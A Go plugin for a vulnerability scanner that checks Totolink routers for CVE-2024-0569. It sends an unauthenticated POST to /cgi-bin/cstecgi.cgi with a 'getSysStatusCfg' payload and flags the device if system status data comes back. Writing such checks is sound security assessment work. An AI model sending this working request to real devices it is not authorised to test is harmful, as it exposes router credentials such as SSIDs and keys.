package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"net/http"
	"strings"
)

func init() {
	Register("totolink_info_leak_cve_2024_0569", &totolink_info_leak_cve_2024_0569{})
}

type totolink_info_leak_cve_2024_0569 struct{}

func (p *totolink_info_leak_cve_2024_0569) Info() PluginInfo {
	return PluginInfo{
		Name:     "Totolink getSysStatusCfg 信息泄露",
		VulnInfo: "该漏洞影响了文件/cgi-bin/cstecgi.cgi中Setting Handler组件的getSysStatusCfg功能。对参数ssid/key的操纵导致信息泄露。",
		VulnID:   "CVE-2024-0569",
		Level:    "9.1 CRITICAL",
		URL:      "",
		Version:  "Totolink < 4.1.5cu.862_B20230228",
		CWE:      "CWE-200	信息暴露",
	}
}

func (p *totolink_info_leak_cve_2024_0569) Check(netloc string) bool {
	payload := `{"topicurl":"getSysStatusCfg","token":""}`
	req, err := http.NewRequest("POST", netloc+"/cgi-bin/cstecgi.cgi", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded:charset=UTF-8")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "\"OperationMode\":") {
		return true
	}
	return false
}
